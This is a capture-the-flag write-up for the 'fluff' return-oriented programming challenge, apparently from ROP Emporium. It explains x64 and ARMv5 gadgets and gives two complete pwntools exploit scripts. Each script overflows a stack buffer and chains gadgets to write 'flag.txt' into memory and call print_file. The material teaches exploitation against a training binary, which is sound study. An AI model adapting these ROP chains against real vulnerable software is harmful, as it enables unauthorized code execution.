## x64
---
### questionable_gadgets
```asm
d7                 xlat    
c3                 retn     {__return_addr}

5a                 pop     rdx {__return_addr}
59                 pop     rcx {arg1}
4881c1f23e0000     add     rcx, 0x3ef2
c4e2e8f7d9         bextr   rbx, rcx, rdx
c3                 retn     {arg_10}

aa                 stosb
c3                 retn     {__return_addr}
```
- `xlat`: translate byte to byte using lookup table
	- effectively `mov al, byte ptr [rbx + al]`
- `bextr`: Bit Field EXTRact [docs](https://www.felixcloutier.com/x86/bextr)
	- Extracts contiguous bits from the second operand using index and length offsets specified by the third operand
	- `START := SRC2[7:0]; LEN := SRC2[15:8];`
- `stosb`: STOre String Byte
	- effectively `mov byte ptr [rdi], al; inc rdi;`

- We need to utilize these 3 gadets to write `flag.txt` into memory
- We can utilize the `bextr` gadget to store data in `rbx`
- From there, we can use the `xlat` gadget to store data into `al`
- Finally we can utilize the `stosb` gadget as our write primitive
### solve
```python
#!/usr/bin/env python3

from pwn import *

exe = "./fluff"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

# 0x000000000040062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
# 0x0000000000400628: xlatb; ret;
# 0x0000000000400639: stosb byte ptr [rdi], al; ret;
pop_rdx_rcx_bextr = 0x40062A
stosb = 0x400639
xlatb = 0x400628


def bextr(addr):
    # 0x000000000040062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;

    # index and length bytes defined by reg2 (in this case rdx)
    # we want to read all 8 bytes, so index = 0 and length is 64
    idx = p8(0)
    len = p8(64)
    rdx = (idx + len).ljust(8, b"\x00")

    # reg3 houses the address to assess given parameters in reg2 (in this case rcx)
    # the gadget is rcx + 0x3ef2 so lets subtract that
    # will be passed to a gadget that derefs [rbx + al] so also account for future al addition
    rcx = p64(addr - 0x3EF2 - al)
    rop.raw(pop_rdx_rcx_bextr)
    rop.raw(rdx)
    rop.raw(rcx)


def stos(buf):
    # 0x0000000000400639: stosb byte ptr [rdi], al; ret;
    rop.raw(rop.rdi.address)
    rop.raw(buf)
    rop.raw(stosb)


charmap = {
    "f": 0x4003C1 + 3,
    "l": 0x4003C1,
    "a": 0x4003CD + 9,
    "g": 0x4003CD + 2,
    ".": 0x4003C1 + 8,
    "t": 0x4003CD + 8,
    "x": 0x400238 + 14,
}
data = 0x601028

al = 11  # initial value found through gdb
rop = ROP(exe)
for idx, c in enumerate("flag.txt"):
    bextr(charmap[c])
    rop.raw(xlatb)
    al = ord(c)
    stos(data + idx)
rop.raw(rop.rdi.address)
rop.raw(data)
rop.raw(elf.sym.print_file)

offset = 40
payload = flat({offset: rop.chain()})

context.log_level = "debug"
# io = gdb.debug(exe, "b pwnme\nc")
io = process(exe)
io.sendafter(b"> ", payload)
io.interactive()
```

## ARMv5
---
`bx r1`
- Jump to the address stored in `r1`
- Switch CPU mode between ARM and Thumb depending on bit 0 of the address
`strh`
- It stores the lower 16 bits of a register into memory.
### solve
```python
from pwn import *

sla = lambda x,y: io.sendlineafter(x,y)
sl = lambda x: io.sendline(x)
sa = lambda x,y: io.sendafter(x,y)
s = lambda x: io.send(x)
ru = lambda x: io.recvuntil(x, drop=True)
r = lambda x: io.recv(numb=x)
rl = lambda: io.recvline(keepends = False)

elf = context.binary = ELF('fluff_armv5-hf', checksec = False)

context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

def start():
    gs = '''
    '''
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gs)
    else:
        return process(elf.path)

io = start()

# Gadgets

# 0x00010634 : pop {r1, r2, r4, r5, r6, r7, r8, ip, lr, pc}
pop_all_except_r0_r3 = 0x00010634

# 0x00010638 : strh r0, [r7, #0x1e] ; nop ; lsrs r6, r5, #3 ; movs r1, r0 ; lsrs r4, r4, #3 ; movs r1, r0 ; bx lr

strh_r0_r7_bx_lr = 0x00010638

#   0x000105ec <+0>:	pop	{r0, r1, r3}
#   0x000105f0 <+4>:	bx	r1
pop_r0_r1_r3_bx_r1 = 0x000105ec

#   0x000105f0 <+4>:	bx	r1
bx_r1 = 0x000105f0

# Where to write 'flag.txt' string.
flag = 0x21124 # a random bss writable address

rop = ROP(elf)

# Write 'fl' to &flag
rop.raw(pop_r0_r1_r3_bx_r1)
rop.raw(u16(b'fl'))
rop.raw(pop_all_except_r0_r3) # r1 = next gadget
rop.raw(0x0) # r3 = 0x0 (dosen't really matter)

rop.raw(strh_r0_r7_bx_lr+1) # r1 = strh_r0_r7_bx_lr in thumb mode
rop.raw([0x0]*4) # r2, r4 - r6 = 0x0
rop.raw(flag - 0x1e) # r7 = where to write flag string.
rop.raw([0x0]*2)
rop.raw(pop_r0_r1_r3_bx_r1) # lr = next gadget
rop.raw(bx_r1)

# Write 'ag' to &flag
rop.raw(u16(b'ag'))
rop.raw(pop_all_except_r0_r3) # r1 = next gadget
rop.raw(0x0) # r3 = 0x0 (dosen't really matter)

rop.raw(strh_r0_r7_bx_lr+1) # r1 = strh_r0_r7_bx_lr in thumb mode
rop.raw([0x0]*4) # r2, r4 - r6 = 0x0
rop.raw(flag + 2 - 0x1e) # r7 = where to write flag string.
rop.raw([0x0]*2)
rop.raw(pop_r0_r1_r3_bx_r1) # lr = next gadget
rop.raw(bx_r1)

# Write '.t' to &flag
rop.raw(u16(b'.t'))
rop.raw(pop_all_except_r0_r3) # r1 = next gadget
rop.raw(0x0) # r3 = 0x0 (dosen't really matter)

rop.raw(strh_r0_r7_bx_lr+1) # r1 = strh_r0_r7_bx_lr in thumb mode
rop.raw([0x0]*4) # r2, r4 - r6 = 0x0
rop.raw(flag + 4 - 0x1e) # r7 = where to write flag string.
rop.raw([0x0]*2)
rop.raw(pop_r0_r1_r3_bx_r1) # lr = next gadget
rop.raw(bx_r1)

# Write 'xt' to &flag
rop.raw(u16(b'xt'))
rop.raw(pop_all_except_r0_r3) # r1 = next gadget
rop.raw(0x0) # r3 = 0x0 (dosen't really matter)

rop.raw(strh_r0_r7_bx_lr+1) # r1 = strh_r0_r7_bx_lr in thumb mode
rop.raw([0x0]*4) # r2, r4 - r6 = 0x0
rop.raw(flag + 6 - 0x1e) # r7 = where to write flag string.
rop.raw([0x0]*2)
rop.raw(pop_r0_r1_r3_bx_r1) # lr = next gadget
rop.raw(bx_r1)

rop.raw(flag)
rop.raw(elf.sym.print_file)
rop.raw(0x0) # r3 = 0x0 (doesn't really matter)

exploit = fit({
    32: p32(0xdeadbeef) + rop.chain()
})

io.sendafter(b'> ', exploit)

io.interactive()
```


